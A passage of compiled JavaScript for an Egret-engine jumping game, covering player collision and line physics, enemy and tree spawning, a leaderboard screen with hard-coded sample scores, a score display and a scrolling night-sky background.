			3 != this.leader.leader_state && 2 == this.leader.up_down && this.line.hitTestPoint(this.leader.bmp.x, this.leader.bmp.y + 9 * this.leader.bmp.height / 60) && (this.removeEventListener(egret.Event.ENTER_FRAME, this.lx_hitTest, this), this.leader.removeEventListener(egret.Event.ENTER_FRAME, this.leader.init_run, this.leader), this.leader.up_down = 0, this.lp.x > this.rp.x && (this.line.x = this.rp.x, this.line.y = this.rp.y, this.line.rotation = 180 / Math.PI * Math.atan2(this.lp.y - this.rp.y,
							this.lp.x - this.rp.x)), this.line.texture = GameApp.cloud_tree_line_sheet.getTexture("line2"), this.line.anchorY = 0.125, this.leader.bmp.texture = 1 == this.leader.left_right ? GameApp.drop_json_sheet.getTexture("groundmoment-") : GameApp.drop_json_sheet.getTexture("groundmoment"), this.timer.addEventListener(egret.TimerEvent.TIMER_COMPLETE, this.stop_moment, this), this.timer.reset(), this.timer.start(), this.leader.leader_state = 2, this.leader.left_right = 0, this.leader.v = d.GameContainer.ov, this.leader.ang = this.line.rotation -
					90, 0 < Math.cos(this.leader.ang / 180 * Math.PI) ? (this.leader.left_right = 1, -60 > this.leader.ang ? (d.GameContainer.rise_state = 1, -90 == this.leader.ang && (d.GameContainer.rise_state = 2)) : d.GameContainer.rise_state = 0) : (this.leader.left_right = 2, -120 < this.leader.ang ? (d.GameContainer.rise_state = -1, -90 == this.leader.ang && (d.GameContainer.rise_state = 2)) : d.GameContainer.rise_state = 0))
		};
		c.prototype.bg_run = function (a) {
			if (2 == this.leader.leader_state && 1 == this.leader.up_down) {
				if (this.leader.bmp.y < this.winheight / 2)
					if (this.bg.speed =
							0 - this.leader.v * Math.sin(this.leader.ang / 180 * Math.PI), 0 < this.bg.speed) {
						this.bg.start();
						this.score.showScore(this.bg.get_score());
						this.line.y += this.bg.speed;
						this.lp.y += this.bg.speed;
						this.rp.y += this.bg.speed;
						15 > this.bg.speed && (this.creat_tree(), this.creat_enemy());
						this.tree.have_tree && 0 < this.tree.trees.length ? this.tree.trees[0].y += this.bg.speed : this.tree.have_tree = !1;
						for (a = 0; a < this.enemy.length; a++) {
							var b = this.enemy[a];
							b.y < this.winheight / 2 + b.height / 2 ? b.y_move(this.bg.speed) : b.y_move(2.5 * this.bg.speed)
						}
						this.leader.bg_is_run =
							!0;
						this.jumpheight = (this.bg.speed + this.leader.v * Math.sin(this.leader.ang / 180 * Math.PI)) / 2
					} else
						this.bg.speed = 0, this.bg.pause(), this.leader.bg_is_run = !1;
				0 >= this.leader.v && (this.leader.leader_state = 2, this.leader.up_down = 2, this.leader.bmp.texture = 1 == this.leader.left_right ? GameApp.original_json_sheet.getTexture("original-7-9") : GameApp.original_json_sheet.getTexture("original7-9"), this.leader.ang = 90);
				this.leader.v -= d.GameContainer.speed_reduce
			}
			3 == this.leader.leader_state && this.bg.pause()
		};
		c.prototype.stop_moment =
		function (a) {
			this.timer.removeEventListener(egret.TimerEvent.TIMER_COMPLETE, this.stop_moment, this);
			this.addChild(this.score);
			this.line.texture = GameApp.cloud_tree_line_sheet.getTexture("line3");
			this.line.anchorY = 0.75;
			this.leader.bmp.texture = 1 == this.leader.left_right ? GameApp.vjump_json_sheet.getTexture("vjump-1") : GameApp.vjump_json_sheet.getTexture("vjump1");
			this.leader.addEventListener(egret.Event.ENTER_FRAME, this.leader.init_run, this.leader);
			this.addEventListener(egret.Event.ENTER_FRAME, this.bg_run,
				this);
			this.timer1.addEventListener(egret.TimerEvent.TIMER_COMPLETE, this.remove_line, this);
			this.timer1.reset();
			this.timer1.start()
		};
		c.prototype.remove_line = function (a) {
			this.timer1.removeEventListener(egret.TimerEvent.TIMER_COMPLETE, this.remove_line, this);
			this.line.visible = !1;
			this.rp.visible = !1;
			this.lp.visible = !1
		};
		c.prototype.enemy_hit_leader = function () {
			var a = new egret.Rectangle,
			b = new egret.Rectangle;
			a.x = this.leader.bmp.x - this.leader.width / 4;
			a.y = this.leader.bmp.y - this.leader.height / 4;
			a.width = this.leader.width /
				2;
			a.height = this.leader.height / 2;
			for (var c = 0; c < this.enemy.length; c++) {
				var d = this.enemy[c];
				b.x = d.x - 2 * d.width / 9;
				b.y = d.y - 2 * d.height / 9;
				b.width = 4 * d.width / 9;
				b.height = 4 * d.height / 9;
				this.myintersects(a.x, a.y, a.width, a.height, b.x, b.y, b.width, b.height) && (this.leader.leader_state = 3)
			}
		};
		c.prototype.myintersects = function (a, b, c, d, e, f, g, l) {
			return a + c > e && a < e + g && b + d > f && b < f + l
		};
		c.prototype.creat_enemy = function () {
			if (0 >= this.enemy.length) {
				var a = this.bg.get_score();
				120 <= a && 200 > a ? (d.Enemy.speed = 0.5, this.enemy_num = 1) : 200 <=
				a && 300 > a ? (d.Enemy.speed = 0.8, this.enemy_num = Math.ceil(2 * Math.random())) : 300 <= a && 500 > a ? (d.Enemy.speed = 1.2, this.enemy_num = 1 + Math.ceil(2 * Math.random())) : 500 <= a && (d.Enemy.speed = 1.5, this.enemy_num = 1 + Math.ceil(2 * Math.random()));
				for (a = 0; a < this.enemy_num; a++) {
					var b = new d.Enemy;
					this.enemy.push(b);
					b.y = 0 - b.height / 3 - 2 * b.height / 3 * a;
					this.addChildAt(b, 1)
				}
			}
		};
		c.prototype.remove_enemy = function (a) {
			0 < this.tree.trees.length && this.hit_left_tree();
			if (0 < this.enemy.length)
				for (this.enemy_hit_leader(), a = 0; a < this.enemy.length; a++) {
					var b =
						this.enemy[a];
					b.y > this.winheight + b.height / 2 && (this.removeChild(b), this.enemy.shift())
				}
		};
		c.prototype.hit_left_tree = function () {
			var a = new egret.Rectangle,
			b = new egret.Rectangle;
			a.x = this.leader.bmp.x - this.leader.width / 4;
			a.y = this.leader.bmp.y - this.leader.height / 4;
			a.width = this.leader.width / 2;
			a.height = this.leader.height / 2;
			0 < this.tree.trees.length && (this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree0") || this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree1") ? b.x =
					this.tree.trees[0].x : b.x = this.tree.trees[0].x + this.tree.trees[0].width / 5, b.y = this.tree.trees[0].y + 2 * this.tree.trees[0].height / 5, b.width = 7 * this.tree.trees[0].width / 10 - 15, b.height = this.tree.trees[0].height / 5, this.myintersects(a.x, a.y, a.width, a.height, b.x, b.y, b.width, b.height) && (this.leader.leader_state = 3))
		};
		c.prototype.tree_swing = function () {
			this.tree_index++;
			this.tree_index %= 15;
			0 < this.tree.trees.length ? 0 == this.tree_index && (this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree0") ?
				this.tree.trees[0].texture = GameApp.cloud_tree_line_sheet.getTexture("tree0b") : this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree1") ? this.tree.trees[0].texture = GameApp.cloud_tree_line_sheet.getTexture("tree1b") : this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree-0") ? this.tree.trees[0].texture = GameApp.cloud_tree_line_sheet.getTexture("tree-0b") : this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree-1") ? this.tree.trees[0].texture = GameApp.cloud_tree_line_sheet.getTexture("tree-1b") :
					this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree0b") ? this.tree.trees[0].texture = GameApp.cloud_tree_line_sheet.getTexture("tree0") : this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree1b") ? this.tree.trees[0].texture = GameApp.cloud_tree_line_sheet.getTexture("tree1") : this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree-0b") ? this.tree.trees[0].texture = GameApp.cloud_tree_line_sheet.getTexture("tree-0") : this.tree.trees[0].texture == GameApp.cloud_tree_line_sheet.getTexture("tree-1b") &&
					(this.tree.trees[0].texture = GameApp.cloud_tree_line_sheet.getTexture("tree-1"))) : this.stop_tree()
		};
		c.prototype.stop_tree = function () {
			this.removeEventListener(egret.Event.ENTER_FRAME, this.tree_swing, this)
		};
		c.prototype.creat_tree = function () {
			this.addEventListener(egret.Event.ENTER_FRAME, this.tree_swing, this);
			this.bg.bmpArr[0].y > 0 - 2 * this.bg.bmpArr[0].height / 5 && (0 < this.tree.trees.length ? (this.tree.have_tree = !0, this.tree.trees[0].y += this.bg.speed, this.tree.out_screen(), this.tree.is_out && this.tree.trees.shift()) :
				this.stop_tree())
		};
		c.prototype.init_start_face = function () {
			this.start_face = new d.StartFace;
			this.addChild(this.start_face);
			this.start_face.addEventListener("rmface", this.rm_face, this)
		};
		c.prototype.rm_face = function () {
			this.start_face.removeEventListener("rmface", this.rm_face, this);
			this.removeChild(this.start_face);
			this.touchEnabled = !0;
			this.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.draw_line, this);
			this.addEventListener(egret.TouchEvent.TOUCH_END, this.draw_line, this);
			this.leader.addEventListener("GAMEOVER",
				this.f_gameover, this)
		};
		c.prototype.f_gameover = function () {
			this.stop_tree();
			this.removeChild(this.line);
			this.removeChild(this.lp);
			this.removeChild(this.rp);
			this.gameover = new d.GameOver;
			this.gameover.overscore(d.Score.global_score);
			this.addChild(this.gameover);
			this.removeEventListener(egret.TouchEvent.TOUCH_BEGIN, this.draw_line, this);
			this.removeEventListener(egret.TouchEvent.TOUCH_END, this.draw_line, this);
			this.removeEventListener(egret.Event.ENTER_FRAME, this.lx_hitTest, this);
			this.gameover.addEventListener("REPLAY",
				this.f_replay, this)
		};
		c.prototype.f_replay = function () {
			this.removeChildren();
			this.createGameScene();
			this.enemy_num = 0;
			this.gameover.removeEventListener("REPLAY", this.f_replay, this)
		};
		c.best_score = 0;
		c.rise_state = 0;
		c.is_sprint = !1;
		c.open_close_music = !0;
		c.wave_v = 0;
		return c
	}
	(egret.DisplayObjectContainer);
	d.GameContainer = e;
	e.prototype.__class__ = "jump.GameContainer"
})(jump || (jump = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.center_x = egret.MainContext.instance.stage.stageWidth / 2;
			this.center_y = egret.MainContext.instance.stage.stageHeight / 2;
			this.temp_x = 0;
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
			this.addEventListener(egret.Event.REMOVED_FROM_STAGE, this.remove_face, this)
		}
		__extends(c, e);
		c.prototype.onAddToStage = function () {
			this.txt_c = new egret.DisplayObjectContainer;
			this.init_front();
			this.init_colourless();
			this.init_myrecord();
			this.init_returnback();
			this.init_ranking1()
		};
		c.prototype.init_ranking1 = function () {
			this.ranking1 = new egret.Bitmap(GameApp.other_sheet.getTexture("ranking1"));
			this.ranking1.anchorX = 0.5;
			this.ranking1.x = this.stage.stageWidth / 2;
			this.ranking1.y = this.stage.stageHeight / 20;
			this.addChild(this.ranking1)
		};
		c.prototype.init_front = function () {
			this.front10 = new egret.Bitmap(GameApp.bigmap_sheet.getTexture("front10"));
			this.front10.anchorX = 0.5;
			this.front10.x = this.stage.stageWidth / 2;
			this.front10.y = this.stage.stageHeight / 7;
			this.addChild(this.front10);
			this.showRanking(0, 8E3);
			this.showRanking(1, 7555);
			this.showRanking(2, 6666);
			this.showRanking(3, 4555);
			this.showRanking(4, 3586);
			this.showRanking(5, 3145);
			this.showRanking(6, 2553);
			this.showRanking(7, 789);
			this.showRanking(8, 600);
			this.showRanking(9, 505);
			this.addChild(this.txt_c)
		};
		c.prototype.init_colourless = function () {
			this.colourless = new egret.Bitmap(GameApp.other_sheet.getTexture("colourless"));
			this.colourless.anchorX = 1;
			this.colourless.x = this.front10.x + this.front10.width / 2 - this.front10.width / 17;
			this.colourless.y =
				this.front10.y + this.front10.height / 22;
			this.addChild(this.colourless);
			this.colourless.touchEnabled = !0;
			this.colourless.addEventListener(egret.TouchEvent.TOUCH_TAP, this.tap_colourless, this)
		};
		c.prototype.tap_colourless = function () {
			if (this.front10.texture == GameApp.bigmap_sheet.getTexture("front10"))
				this.colourless.anchorX = 0, this.colourless.x = this.front10.x - this.front10.width / 2 + this.front10.width / 17, this.front10.texture = GameApp.bigmap_sheet.getTexture("myrecord"), this.removeChild(this.txt_c), this.addChild(this.map_biaoyu),
				this.overscore();
			else if (this.front10.texture == GameApp.bigmap_sheet.getTexture("myrecord")) {
				this.colourless.anchorX = 1;
				this.colourless.x = this.front10.x + this.front10.width / 2 - this.front10.width / 17;
				this.front10.texture = GameApp.bigmap_sheet.getTexture("front10");
				this.addChild(this.txt_c);
				this.removeChild(this.map_biaoyu);
				this.removeChild(this.big_m);
				for (var a = 0; a < this.temp_num.length; a++)
					this.removeChild(this.temp_num[a])
			}
		};
		c.prototype.init_myrecord = function () {
			this.map_biaoyu = new egret.Bitmap(GameApp.other_sheet.getTexture("biaoyu"));
			this.map_biaoyu.anchorX = 0.5;
			this.map_biaoyu.anchorY = 0.5;
			this.map_biaoyu.x = egret.MainContext.instance.stage.stageWidth / 2;
			this.map_biaoyu.y = 2 * egret.MainContext.instance.stage.stageHeight / 5
		};
		c.prototype.init_returnback = function () {
			this.returnback = new egret.Bitmap(GameApp.other_sheet.getTexture("return"));
			this.returnback.x = this.stage.stageWidth / 20;
			this.returnback.y = 17 * this.stage.stageHeight / 20;
			this.addChild(this.returnback);
			this.returnback.touchEnabled = !0;
			this.returnback.addEventListener(egret.TouchEvent.TOUCH_TAP,
				this.back_face, this)
		};
		c.prototype.back_face = function () {
			this.returnback.removeEventListener(egret.TouchEvent.TOUCH_TAP, this.back_face, this);
			this.colourless.removeEventListener(egret.TouchEvent.TOUCH_TAP, this.tap_colourless, this);
			this.removeChildren();
			this.dispatchEventWith("back_face")
		};
		c.prototype.set_x = function () {
			this.one_w = new egret.Bitmap(GameApp.other_sheet.getTexture("big_0"));
			this.big_m = new egret.Bitmap(GameApp.other_sheet.getTexture("big_m"));
			this.big_m.scaleX = 0.5;
			this.big_m.scaleY = 0.5;
			if (0 ==
				this.temp_x % 2)
				for (var a = this.temp_x / 2 - 1, b = 0; b < this.temp_num.length; b++)
					this.temp_num[b].x = b <= a ? this.center_x + this.one_w.width / 2 / 2 + (a - b) * this.one_w.width / 2 - this.big_m.width / 2 / 2 : this.center_x - this.one_w.width / 2 / 2 - (b - a - 1) * this.one_w.width / 2 - this.big_m.width / 2 / 2, this.addChild(this.temp_num[b]);
			else
				for (a = Math.ceil(this.temp_x / 2) - 1, b = 0; b < this.temp_num.length; b++)
					this.temp_num[b].x = b < a ? this.center_x + (a - b) * this.one_w.width / 2 - this.big_m.width / 2 / 2 : b == a ? this.center_x - this.big_m.width / 2 / 2 : this.center_x - (b - a) *
						this.one_w.width / 2 - this.big_m.width / 2 / 2, this.addChild(this.temp_num[b]);
			this.big_m.anchorX = 0.5;
			this.big_m.anchorY = 0.5;
			this.big_m.y = this.temp_num[0].y;
			this.big_m.x = this.temp_num[0].x + this.temp_num[0].width / 2 / 2 + this.big_m.width / 2 / 2;
			this.addChild(this.big_m)
		};
		c.prototype.creat_num = function (a) {
			a = new egret.Bitmap(a);
			a.anchorX = 0.5;
			a.anchorY = 0.5;
			a.scaleX = 0.5;
			a.scaleY = 0.5;
			a.y = this.center_y;
			this.temp_num.push(a)
		};
		c.prototype.overscore = function () {
			var a = d.GameContainer.best_score;
			this.temp_num = [];
			for (var a =
					a.toString(), b = this.temp_x = a.length; 0 <= b; b--)
				switch (a[b]) {
				case "0":
					this.creat_num(GameApp.other_sheet.getTexture("big_0"));
					break;
				case "1":
					this.creat_num(GameApp.other_sheet.getTexture("big_1"));
					break;
				case "2":
					this.creat_num(GameApp.other_sheet.getTexture("big_2"));
					break;
				case "3":
					this.creat_num(GameApp.other_sheet.getTexture("big_3"));
					break;
				case "4":
					this.creat_num(GameApp.other_sheet.getTexture("big_4"));
					break;
				case "5":
					this.creat_num(GameApp.other_sheet.getTexture("big_5"));
					break;
				case "6":
					this.creat_num(GameApp.other_sheet.getTexture("big_6"));
					break;
				case "7":
					this.creat_num(GameApp.other_sheet.getTexture("big_7"));
					break;
				case "8":
					this.creat_num(GameApp.other_sheet.getTexture("big_8"));
					break;
				case "9":
					this.creat_num(GameApp.other_sheet.getTexture("big_9"))
				}
			this.set_x()
		};
		c.prototype.showRanking = function (a, b) {
			this.txt = new egret.TextField;
			this.txt.width = egret.MainContext.instance.stage.stageWidth;
			this.txt.textColor = 0;
			this.txt.size = 32;
			this.txt.x = egret.MainContext.instance.stage.stageWidth / 2 - 4 * this.front10.width / 15;
			this.txt.y = this.front10.y + 3 * this.front10.height /
				16 + this.front10.height * a / 13;
			this.txt_c.addChild(this.txt);
			this.txt.text = "\u7b2c" + (a + 1) + "\u540d:" + b + "\u5206"
		};
		c.prototype.main_ranking = function () {};
		c.prototype.remove_face = function () {
			this.removeEventListener(egret.Event.REMOVED_FROM_STAGE, this.remove_face, this)
		};
		return c
	}
	(egret.DisplayObjectContainer);
	d.Ramking = e;
	e.prototype.__class__ = "jump.Ramking"
})(jump || (jump = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.temp_x = 0;
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.addtostage, this)
		}
		__extends(c, e);
		c.prototype.addtostage = function () {
			this.init_count();
			this.init_num();
			this.set_x()
		};
		c.prototype.init_count = function () {
			this.count = new egret.Bitmap(GameApp.other_sheet.getTexture("count"));
			this.count.x = 0;
			this.count.y = 10;
			this.addChild(this.count)
		};
		c.prototype.init_num = function () {
			this.num = [];
			for (var a = 0; 10 > a; a++) {
				var b = new egret.Bitmap;
				this.num.push(b)
			}
			this.num[0].texture =
				GameApp.other_sheet.getTexture("small_0");
			this.num[1].texture = GameApp.other_sheet.getTexture("small_1");
			this.num[2].texture = GameApp.other_sheet.getTexture("small_2");
			this.num[3].texture = GameApp.other_sheet.getTexture("small_3");
			this.num[4].texture = GameApp.other_sheet.getTexture("small_4");
			this.num[5].texture = GameApp.other_sheet.getTexture("small_5");
			this.num[6].texture = GameApp.other_sheet.getTexture("small_6");
			this.num[7].texture = GameApp.other_sheet.getTexture("small_7");
			this.num[8].texture = GameApp.other_sheet.getTexture("small_8");
			this.num[9].texture = GameApp.other_sheet.getTexture("small_9")
		};
		c.prototype.set_x = function () {
			this.temp_num = [];
			for (var a = 0; 8 > a; a++) {
				var b = new egret.Bitmap(this.num[0].texture);
				this.temp_num.push(b);
				b.y = 18;
				b.x = a * this.count.width / 11;
				this.addChild(b)
			}
			b = new egret.Bitmap(GameApp.other_sheet.getTexture("small_m"));
			b.y = 15;
			b.x = a * this.count.width / 11;
			this.addChild(b)
		};
		c.prototype.creat_num = function (a) {
			this.temp_num[this.temp_x].texture = this.num[a].texture
		};
		c.prototype.showScore = function (a) {
			d.Score.global_score =
				a;
			this.temp_x = 9;
			this.score = new String(a.toString());
			for (a = this.score.length; 0 <= a; a--)
				switch (this.temp_x--, this.score[a]) {
				case "0":
					this.creat_num(0);
					break;
				case "1":
					this.creat_num(1);
					break;
				case "2":
					this.creat_num(2);
					break;
				case "3":
					this.creat_num(3);
					break;
				case "4":
					this.creat_num(4);
					break;
				case "5":
					this.creat_num(5);
					break;
				case "6":
					this.creat_num(6);
					break;
				case "7":
					this.creat_num(7);
					break;
				case "8":
					this.creat_num(8);
					break;
				case "9":
					this.creat_num(9)
				}
		};
		c.global_score = 0;
		return c
	}
	(egret.DisplayObjectContainer);
	d.Score = e;
	e.prototype.__class__ = "jump.Score"
})(jump || (jump = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.hitTest = function (c, a) {
			var b = c.getBounds(),
			d = a.getBounds();
			b.x = c.x;
			b.y = c.y;
			d.x = a.x;
			d.y = a.y;
			return b.intersects(d)
		};
		return d
	}
	();
	d.GameUtil = e;
	e.prototype.__class__ = "jump.GameUtil";
	d.createBitmapByName = function (d) {
		var c = new egret.Bitmap;
		d = RES.getRes(d);
		c.texture = d;
		return c
	}
})(jump || (jump = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this.score = this.speed = 0;
			this.bg_alpha = 1;
			this.h_cloud = 0;
			this.add_bg1_key = !0;
			this.add_bg1_time = 0;
			this.del_bg1_key = !0;
			this.del_bg1_time = 250;
			this.add_moon_key = !0;
			this.add_moon_time = 0;
			this.add_bg2_key = !0;
			this.add_bg2_time = 0;
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
			this.addEventListener(egret.Event.REMOVED_FROM_STAGE, this.rm_stage, this)
		}
		__extends(c, e);
		c.prototype.onAddToStage = function (a) {
			this.removeEventListener(egret.Event.ADDED_TO_STAGE,
				this.onAddToStage, this);
			this.stageW = this.stage.stageWidth;
			this.stageH = this.stage.stageHeight;
			this.score = this.stageH / 2 / 100;
			this.bg_bottom = new egret.Bitmap(GameApp.bigmap_sheet.getTexture("bg3"));
			this.bg_bottom.anchorX = 0.5;
			this.bg_bottom.x = this.stageW / 2;
			this.bg_bottom.y = 0;
			this.addChild(this.bg_bottom);
			this.textureHeight = GameApp.bigmap_sheet.getTexture("bg2").textureHeight;
			this.rowCount = Math.ceil(this.stageH / this.textureHeight) + 1;
			this.bmpArr = [];
			a = d.createBitmapByName("bg1_png");
			a.y = 0 - (a.height - this.stageH);
			this.bmpArr.push(a);
			this.addChild(a);
			a = new egret.Bitmap(GameApp.bigmap_sheet.getTexture("bg2"));
			a.alpha = 0;
			this.bmpArr.push(a);
			this.addChild(a);
			a = new egret.Bitmap(GameApp.bigmap_sheet.getTexture("bg3"));
			a.alpha = 0;
			this.bmpArr.push(a);
			this.addChild(a);
			this.big_moon = new egret.Bitmap(GameApp.cloud_tree_line_sheet.getTexture("big_moon"));
			this.big_moon.anchorX = 0.5;
			this.big_moon.x = this.stageW / 2;
			this.big_moon.y = 0;
			this.big_moon.alpha = 0;
			this.addChild(this.big_moon);
			this.small_moon = new egret.Bitmap(GameApp.cloud_tree_line_sheet.getTexture("small_moon"));
			this.small_moon.anchorX = 0.5;
			this.small_moon.x = this.stageW / 2;
			this.small_moon.y = 0;
			this.small_moon.alpha = 0;
			this.addChild(this.small_moon);
			this.cloud_texture = [];
			this.cloud_texture[0] = GameApp.cloud_tree_line_sheet.getTexture("cloud1");
			this.cloud_texture[1] = GameApp.cloud_tree_line_sheet.getTexture("cloud2");
			this.cloud_texture[2] = GameApp.cloud_tree_line_sheet.getTexture("cloud3");
			this.cloud_texture[3] = GameApp.cloud_tree_line_sheet.getTexture("cloud4");
			this.cloud_texture[4] = GameApp.cloud_tree_line_sheet.getTexture("cloud5");
			this.clouds = [];
			this.h_cloud = this.stageH / 5;
			for (a = 0; 3 > a; a++) {
				var b = Math.max(Math.ceil(5 * Math.random()), 1) - 1,
				b = new d.Cloud(this.cloud_texture[b]);
				b.y = 0 - this.h_cloud * (a + 1) - this.stageH / 3 * a;
				this.clouds.push(b);
				this.addChild(b)
			}
		};
		c.prototype.start = function () {
			this.removeEventListener(egret.Event.ENTER_FRAME, this.enterFrameHandler, this);
			this.addEventListener(egret.Event.ENTER_FRAME, this.enterFrameHandler, this)
		};
		c.prototype.getspeedOffset = function () {
			var a = egret.getTimer(),
			b = 1E3 / (a - this._lastTime);
			this._lastTime =
				a;
			this.speedOffset = 60 / b
		};
		c.prototype.enterFrameHandler = function (a) {
			a = this.bmpArr[0];
			this.score += this.speed / 100;
			0 != a.y ? a.y = 0 < a.y + this.speed ? 0 : a.y + this.speed : a.y >= 0 - this.bmpArr[1].height && 1 > this.bmpArr[1].alpha && !0 == this.add_bg1_key && (this.removeEventListener(egret.Event.ENTER_FRAME, this.add_bg1, this), this.addEventListener(egret.Event.ENTER_FRAME, this.add_bg1, this));
			if (!1 == this.add_bg1_key)
				for (a = 0; a < this.clouds.length; a++) {
					var b = this.clouds[a];
					b.set_speed(this.speed);
					if (b.y > this.stageH) {
						var c = Math.max(Math.ceil(5 *
									Math.random()), 1) - 1;
						b.texture = this.cloud_texture[c];
						b.y = 0 - b.height;
						b.x = Math.ceil(Math.random() * this.stage.stageWidth)
					}
					this.removeEventListener(egret.Event.ENTER_FRAME, b.cloud_run, b);
					this.addEventListener(egret.Event.ENTER_FRAME, b.cloud_run, b)
				}
			400 < this.score && !0 == this.del_bg1_key && (this.removeEventListener(egret.Event.ENTER_FRAME, this.del_bg1, this), this.addEventListener(egret.Event.ENTER_FRAME, this.del_bg1, this))
		};
		c.prototype.pause = function () {
			this.removeEventListener(egret.Event.ENTER_FRAME, this.enterFrameHandler,
				this)
		};
		c.prototype.get_score = function () {
			return Math.ceil(this.score)
		};
		c.prototype.add_bg1 = function (a) {
			this.add_bg1_time++;
			1 < 0.004 * this.add_bg1_time ? (this.bg_alpha = 1, this.add_bg1_key = !1, this.removeEventListener(egret.Event.ENTER_FRAME, this.add_bg1, this)) : this.bg_alpha = 0.004 * this.add_bg1_time;
			this.bmpArr[1].alpha = this.bg_alpha;
			this.small_moon.alpha = this.bg_alpha
		};
		c.prototype.del_bg1 = function (a) {
			this.del_bg1_time--;
			0 > 0.004 * this.del_bg1_time ? (this.bg_alpha = 0, this.del_bg1_key = !1, this.removeEventListener(egret.Event.ENTER_FRAME,
					this.add_moon, this), this.addEventListener(egret.Event.ENTER_FRAME, this.add_moon, this), this.removeEventListener(egret.Event.ENTER_FRAME, this.del_bg1, this)) : this.bg_alpha = 0.004 * this.del_bg1_time;
			this.bmpArr[1].alpha = this.bg_alpha;
			this.small_moon.alpha = this.bg_alpha
		};
		c.prototype.add_moon = function (a) {
			this.add_moon_time++;
			1 < 0.004 * this.add_moon_time ? (this.bg_alpha = 1, this.add_moon_key = !1, this.removeEventListener(egret.Event.ENTER_FRAME, this.add_moon, this)) : this.bg_alpha = 0.004 * this.add_moon_time;
			this.big_moon.alpha =
				this.bg_alpha;
			0.5 < this.big_moon.alpha && (this.removeEventListener(egret.Event.ENTER_FRAME, this.add_bg2, this), this.addEventListener(egret.Event.ENTER_FRAME, this.add_bg2, this))
		};
		c.prototype.add_bg2 = function (a) {
			this.add_bg2_time++;
			1 < 0.004 * this.add_bg2_time ? (this.bg_alpha = 1, this.add_bg2_key = !1, this.removeEventListener(egret.Event.ENTER_FRAME, this.add_bg2, this)) : this.bg_alpha = 0.004 * this.add_bg2_time;
			this.bmpArr[2].alpha = this.bg_alpha
		};
		c.prototype.rm_stage = function () {
			this.removeEventListener(egret.Event.ENTER_FRAME,
				this.add_bg2, this);
			this.removeEventListener(egret.Event.ENTER_FRAME, this.add_moon, this);
			this.removeEventListener(egret.Event.ENTER_FRAME, this.del_bg1, this);
			this.removeEventListener(egret.Event.ENTER_FRAME, this.add_bg1, this);
			this.removeEventListener(egret.Event.ENTER_FRAME, this.enterFrameHandler, this)
		};
		return c
	}
	(egret.DisplayObjectContainer);
	d.BgMap = e;
	e.prototype.__class__ = "jump.BgMap"
})(jump || (jump = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (d) {
		function c() {
			d.call(this);
			this.index = this.v = this.left_right = 0;
			this.i = 15;
			this.texture = GameApp.enemy_sprint_json.getTexture("enemy1");
			this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
			this.addEventListener(egret.Event.REMOVED_FROM_STAGE, this.rm_stage, this)
		}
		__extends(c, d);
		c.prototype.onAddToStage = function (a) {
			this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
			this.x = this.width / 4 + Math.random() * (egret.MainContext.instance.stage.stageWidth -
					this.width / 2);
			this.scaleX = 2 / 3;
			this.scaleY = 2 / 3;
			this.anchorY = this.anchorX = 0.5;
			this.v = c.speed;
			this.change_v();
			this.addEventListener(egret.Event.ENTER_FRAME, this.enemy_move, this)
		};
		c.prototype.y_move = function (a) {
			this.y += a
		};
		c.prototype.enemy_move = function (a) {
			this.x += this.v;
			this.change_png();
			this.x <= this.width / 3 && 2 != this.left_right && this.change_v();
			this.x >= egret.MainContext.instance.stage.stageWidth - this.width / 3 && 1 != this.left_right && this.change_v()
		};
		c.prototype.change_png = function () {
			if (2 == this.left_right)
				switch (this.index) {
				case 0 *
					this.i:
					this.texture = GameApp.enemy_sprint_json.getTexture("enemy1");
					break;
				case 1 * this.i:
					this.texture = GameApp.enemy_sprint_json.getTexture("enemy2");
					break;
				case 2 * this.i:
					this.texture = GameApp.enemy_sprint_json.getTexture("enemy3");
					break;
				case 3 * this.i:
					this.texture = GameApp.enemy_sprint_json.getTexture("enemy4")
				}
			else if (1 == this.left_right)
				switch (this.index) {
				case 0 * this.i:
					this.texture = GameApp.enemy_sprint_json.getTexture("enemy-1");
					break;
				case 1 * this.i:
					this.texture = GameApp.enemy_sprint_json.getTexture("enemy-2");
					break;
				case 2 * this.i:
					this.texture = GameApp.enemy_sprint_json.getTexture("enemy-3");
					break;
				case 3 * this.i:
					this.texture = GameApp.enemy_sprint_json.getTexture("enemy-4")
				}
			this.index++;
			this.index %= 4 * this.i
		};
		c.prototype.change_v = function () {
			2 != this.left_right ? (this.left_right = 2, this.v = c.speed) : 1 != this.left_right && (this.left_right = 1, this.v = 0 - c.speed)
		};
		c.prototype.rm_stage = function () {
